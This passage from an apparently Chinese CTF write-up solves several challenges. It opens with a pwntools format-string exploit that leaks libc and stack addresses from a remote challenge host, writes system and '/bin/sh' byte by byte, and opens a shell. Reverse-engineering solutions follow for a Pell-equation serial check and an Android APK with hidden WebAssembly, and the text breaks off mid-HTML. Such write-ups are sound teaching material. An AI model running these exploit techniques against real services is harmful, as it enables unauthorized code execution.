<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;./format&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;120&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;152.136.18.34&quot;</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./format&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&quot;./libc-2.23.so&quot;&#125;)</span></span><br><span class="line">io = remote(ip,port)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc =ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#print io.libs()</span></span><br><span class="line"><span class="comment">#proc_base = io.libs()[&#x27;/mnt/hgfs/ReIt/3/CurseofPyramid/format&#x27;]</span></span><br><span class="line"><span class="comment">#log.info(&#x27;proc_base:&#x27;+hex(proc_base))</span></span><br><span class="line"><span class="comment">#libc_base = io.libs()[&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;]</span></span><br><span class="line"><span class="comment">#log.info(&#x27;libc_base:&#x27;+hex(libc_base))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;What do tou want to say:&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leaking</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%3$p %11$p %5$p &quot;</span>)</span><br><span class="line"></span><br><span class="line">proc = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27; &#x27;</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>),<span class="number">16</span>)-<span class="number">0x8f3</span></span><br><span class="line">log.info(<span class="string">&quot;proc:&quot;</span>+<span class="built_in">hex</span>(proc))</span><br><span class="line">libc.address = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27; &#x27;</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>),<span class="number">16</span>)-<span class="number">0x18637</span></span><br><span class="line">log.info(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># one = libc.address+0x3a819</span></span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;binsh:&quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">stack = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27; &#x27;</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>),<span class="number">16</span>)-<span class="number">0x98</span></span><br><span class="line">log.info(<span class="string">&quot;stack:&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># change 1 byte</span></span><br><span class="line">temp = stack&amp;<span class="number">0xffff</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%5$hn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line">temp = system&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%53$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line"></span><br><span class="line">temp = (stack&amp;<span class="number">0xff</span>)+<span class="number">1</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%5$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line">temp = (system&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%53$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line"></span><br><span class="line">temp = (stack&amp;<span class="number">0xff</span>)+<span class="number">2</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%5$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line">temp = (system&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%53$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line"></span><br><span class="line">temp = (stack&amp;<span class="number">0xff</span>)+<span class="number">3</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%5$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line">temp = (system&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%53$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line"></span><br><span class="line">temp = (stack&amp;<span class="number">0xff</span>)+<span class="number">8</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%5$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line">temp = binsh&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%53$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line"></span><br><span class="line">temp = (stack&amp;<span class="number">0xff</span>)+<span class="number">9</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%5$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line">temp = (binsh&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%53$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line"></span><br><span class="line">temp = (stack&amp;<span class="number">0xff</span>)+<span class="number">10</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%5$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line">temp = (binsh&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%53$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line"></span><br><span class="line">temp = (stack&amp;<span class="number">0xff</span>)+<span class="number">11</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%5$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *&#x27;+hex(proc_base+0x951))</span></span><br><span class="line">temp = (binsh&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%&#123;0&#125;c%53$hhn&quot;</span>.<span class="built_in">format</span>(temp))</span><br><span class="line"></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify ecx</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="4-达芬奇的密码-✅"><a href="#4-达芬奇的密码-✅" class="headerlink" title="4-达芬奇的密码 ✅"></a>4-达芬奇的密码 ✅</h2><p>目标是MFC程序<br>先找到时间按钮的触发函数后，分析其逻辑发现有一段SMC，将后面要call到的函数0x4010e0内容修改了，于是执行到SMC后，将程序DUMP下来后再分析:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00401F16                 cmp     eax, 10h</span><br><span class="line">.text:00401F19                 jnz     loc_401FDA</span><br><span class="line">.text:00401F1F                 xor     eax, eax</span><br></pre></td></tr></table></figure>
<p>sn 的长度为0x10</p>
<p>sn 与如下字符串异或，其中将sn分成了前8个byte(64bit) x与后8byte(64bit) y</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:00401101                 mov     byte ptr [esp+98h+var_90], 16h</span><br><span class="line">.text:00401106                 mov     byte ptr [esp+98h+var_90+1], 96h</span><br><span class="line">.text:0040110B                 mov     byte ptr [esp+98h+var_90+2], 8Ch</span><br><span class="line">.text:00401110                 mov     byte ptr [esp+98h+var_90+3], 0E3h</span><br><span class="line">.text:00401115                 mov     byte ptr [esp+98h+var_8C+1], 98h</span><br><span class="line">.text:0040111A                 mov     byte ptr [esp+98h+var_8C+2], 6Eh</span><br><span class="line">.text:0040111F                 mov     byte ptr [esp+98h+var_8C+3], 64h</span><br><span class="line">.text:00401124                 mov     byte ptr [esp+98h+var_88], 84h</span><br><span class="line">.text:00401129                 mov     byte ptr [esp+98h+var_88+1], 8</span><br><span class="line">.text:0040112E                 mov     byte ptr [esp+98h+var_88+2], 0DCh</span><br><span class="line">.text:00401133                 mov     byte ptr [esp+98h+var_84], 0BEh</span><br><span class="line">.text:00401138                 mov     byte ptr [esp+98h+var_84+1], 4Dh</span><br><span class="line">.text:0040113D                 mov     byte ptr [esp+98h+var_84+2], 48h</span><br><span class="line">.text:00401142                 mov     byte ptr [esp+98h+var_84+3], 4Fh</span><br></pre></td></tr></table></figure>

<p>再逆向分析，结合简单的动态调试发现，程序在做大数乘法</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    v10 = *((<span class="type">unsigned</span> __int8 *)&amp;v42 + v6) + v8 * *((<span class="type">unsigned</span> __int8 *)&amp;v38 + v7);</span><br><span class="line">    v9[v7] = *((_BYTE *)&amp;v42 + v6) + v8 * *((_BYTE *)&amp;v38 + v7);</span><br><span class="line">    ++v7;</span><br><span class="line">    *((_BYTE *)&amp;v42 + v6) = <span class="built_in">HIBYTE</span>(v10);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">while</span> ( v7 &lt; <span class="number">8</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    v13 = (<span class="type">char</span>)v11 + *((<span class="type">unsigned</span> __int8 *)&amp;temp1 + v12 + v6) + (<span class="type">unsigned</span> __int8)v9[v12];</span><br><span class="line">    *((_BYTE *)&amp;temp1 + v12++ + v6) = v13;</span><br><span class="line">    v11 = (<span class="type">signed</span> <span class="type">int</span>)v13 &gt;&gt; <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v12 &lt; <span class="number">9</span> );</span><br></pre></td></tr></table></figure>
<p>此为$x^2$与$y^2$</p>
<p>之后的内容在分析得到最后式子为$x^2-7y^2&#x3D;8$，注意x的范围有个限制，并且注意到减法没有借位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401246                 test    byte ptr [esp+98h+var_6C+3], 0F0h</span><br><span class="line">.text:0040124B                 jnz     loc_4013FE</span><br></pre></td></tr></table></figure>

<p>该式为佩尔方程，有通解，通过wolframalpha解方程:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># mathematica</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">0</span>]: Reduce[x^<span class="number">2</span> - <span class="number">7</span>*y^<span class="number">2</span> == <span class="number">8</span> &amp;&amp; x &gt; FromDigits[<span class="string">&quot;FFFFFFFFFFFFFF&quot;</span>, <span class="number">16</span>] &amp;&amp;</span><br><span class="line">x &lt; FromDigits[<span class="string">&quot;1000000000000000&quot;</span>, <span class="number">16</span>] &amp;&amp; y&gt;<span class="number">0</span>, &#123;x, y&#125;, Integers]</span><br><span class="line"></span><br><span class="line">Out[<span class="number">0</span>]: (x == <span class="number">385044246406735194</span> &amp;&amp; y == <span class="number">145533045678356702</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">x = 0x557f3b3b9e1a55a</span></span><br><span class="line"><span class="string">y = 0x2050988b2bd38de</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tmp = []</span></span><br><span class="line"><span class="string">for i in struct.pack(&#x27;&lt;Q&#x27;,x)+struct.pack(&#x27;&lt;Q&#x27;,y):</span></span><br><span class="line"><span class="string">    tmp.append(ord(i))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">v30 = 0xE38C9616</span></span><br><span class="line"><span class="string">v31 = 0x646E9881</span></span><br><span class="line"><span class="string">v32 = 0x81DC0884</span></span><br><span class="line"><span class="string">v33 = 0x4F484DBE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pp = lambda x:struct.pack(&#x27;&lt;I&#x27;,x)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor = []</span></span><br><span class="line"><span class="string">for j in pp(v30)+pp(v31)+pp(v32)+pp(v33):</span></span><br><span class="line"><span class="string">    xor.append(ord(j))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag = &quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(16):</span></span><br><span class="line"><span class="string">    #print(chr(tmp[i]^xor[i]))</span></span><br><span class="line"><span class="string">    flag+=chr(tmp[i]^xor[i])</span></span><br><span class="line"><span class="string">print(flag)</span></span><br><span class="line"><span class="string">    # print(tmp[i]^xor[i])</span></span><br></pre></td></tr></table></figure>

<h2 id="5-丛林的秘密-❌"><a href="#5-丛林的秘密-❌" class="headerlink" title="5-丛林的秘密 ❌"></a>5-丛林的秘密 ❌</h2><p>收货还是很大的一道题目</p>
<p>首先，安卓8.1,在Genymotion中下载一个Android 9.0版本的Phone才运行起来</p>
<p>用Jaxd打开APK，找到MainActivity主逻辑:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button button1;</span><br><span class="line">    <span class="keyword">private</span> EditText eText1;</span><br><span class="line">    <span class="keyword">private</span> TextView txView1;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">u</span> <span class="operator">=</span> gogogoJNI.sayHello();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;gogogo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Access modifiers changed, original: protected */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView((<span class="type">int</span>) R.layout.activity_main);</span><br><span class="line">        <span class="built_in">this</span>.eText1 = (EditText) findViewById(R.id.editText);</span><br><span class="line">        <span class="built_in">this</span>.txView1 = (TextView) findViewById(R.id.textView);</span><br><span class="line">        ((WView) findViewById(R.id.text1View)).loadUrl(<span class="built_in">this</span>.u);</span><br><span class="line">        ((WebView) findViewById(R.id.text1View)).getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">this</span>.button1 = (Button) findViewById(R.id.button);</span><br><span class="line">        <span class="built_in">this</span>.button1.setOnClickListener(<span class="keyword">new</span> <span class="title class_">OnClickListener</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (gogogoJNI.check_key(MainActivity.<span class="built_in">this</span>.eText1.getText().toString()) == <span class="number">1</span>) &#123;</span><br><span class="line">                    MainActivity.<span class="built_in">this</span>.txView1.setText(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    MainActivity.<span class="built_in">this</span>.txView1.setText(<span class="string">&quot;Not Correct!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现调用了gogogo的so库，该库名称为libgogogo.so,分析一通check_key没结果，原来是作者故意混淆加入的。</p>
<p>之后发现，在init_proc 中加入了一个网页于是去解密了一下，得到一个HTML 与 URL, 原来crack的APK是将HTML绑定到8000端口访问</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_url</span></span><br><span class="line"><span class="keyword">if</span> STEP1:</span><br><span class="line"></span><br><span class="line">    enc1 = [<span class="number">0xE</span>,<span class="number">0x12</span>,<span class="number">0x12</span>,<span class="number">0x16</span>,<span class="number">0x5C</span>,<span class="number">0x49</span>,<span class="number">0x49</span>,<span class="number">0x57</span>,<span class="number">0x54</span>,<span class="number">0x51</span>,<span class="number">0x48</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0x57</span>,<span class="number">0x5C</span>,<span class="number">0x5E</span>,<span class="number">0x56</span>,<span class="number">0x56</span>, <span class="number">0x56</span>]</span><br><span class="line">    url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> enc1:</span><br><span class="line">        url+=<span class="built_in">chr</span>(byte^<span class="number">0x66</span>)</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get_html</span></span><br><span class="line"><span class="keyword">if</span> STEP2:</span><br><span class="line">    path = <span class="string">&quot;/Users/apple/Competion/CTF/CTFPro/2019/kctf-q2/5/1.html&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path,<span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> idc.get_bytes(<span class="number">0x4004</span>,<span class="number">0x85F3</span>):</span><br><span class="line">            f.write(byte^<span class="number">0x67</span>)</span><br></pre></td></tr></table></figure>
<p>将HTML查看，发现其中主逻辑藏在webassambly中</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> instance;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">WebAssembly</span>.<span class="title function_">compile</span>(<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">00 61 73 6D 01 00 00 00 01 1B 05 60 00 00 60 04</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">7F 7F 7F 7F 01 7F 60 02 7F 7F 01 7F 60 01 7F 01</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">7F 60 00 01 7F 03 0E 0D 00 01 01 01 01 01 01 01</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">01 02 03 04 04 04 05 01 70 01 01 01 05 03 01 00</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">02 06 15 03 7F 01 41 D0 89 04 0B 7F 00 41 D0 89</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">04 0B 7F 00 41 CC 09 0B 07 57 06 06 6D 65 6D 6F</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">72 79 02 00 0B 5F 5F 68 65 61 70 5F 62 61 73 65</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">03 01 0A 5F 5F 64 61 74 61 5F 65 6E 64 03 02 0E</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">.. .. .. .. .. .. .. .. .. .. .. .. .. .. .. ..</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">6F 6F 6F 6F 09 0E 73 65 74 5F 69 6E 70 75 74 5F</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">66 6C 61 67 0A 12 73 65 74 5F 69 6E 70 75 74 5F</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">66 6C 61 67 5F 6C 65 6E 0B 09 63 68 65 63 6B 5F</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">6B 65 79 0C 03 78 78 78</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">`</span>.<span class="title function_">trim</span>().<span class="title function_">split</span>(<span class="regexp">/[\s\r\n]+/g</span>).<span class="title function_">map</span>(<span class="function"><span class="params">str</span> =&gt;</span> <span class="built_in">parseInt</span>(str, <span class="number">16</span>))</span></span><br><span class="line"><span class="language-javascript">    )).<span class="title function_">then</span>(<span class="function"><span class="params">module</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span 